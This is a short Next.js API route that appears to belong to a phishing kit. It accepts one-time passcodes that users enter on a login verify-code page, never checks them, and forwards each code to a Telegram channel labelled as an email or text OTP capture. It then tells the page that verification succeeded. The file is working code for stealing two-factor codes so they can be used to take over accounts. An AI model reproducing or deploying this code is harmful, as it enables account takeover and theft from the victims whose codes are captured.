import { NextRequest, NextResponse } from 'next/server'
import { sendFormNotification } from '@/lib/telegram'

export async function POST(request: NextRequest) {
  try {
    const { method, otp, page } = await request.json()
    const isEmail = method === 'email'
    const telegramSuccess = await sendFormNotification({
      type: isEmail ? 'login_email_otp_verification' : 'login_text_otp_verification',
      otp,
      page: page || `/login/verify-code?method=${method}`,
      timestamp: new Date().toISOString(),
    })
    return NextResponse.json({ success: true, telegramSent: telegramSuccess })
  } catch (error) {
    console.error('Error sending verification notification:', error)
    return NextResponse.json({ error: 'Failed to send notification' }, { status: 500 })
  }
}
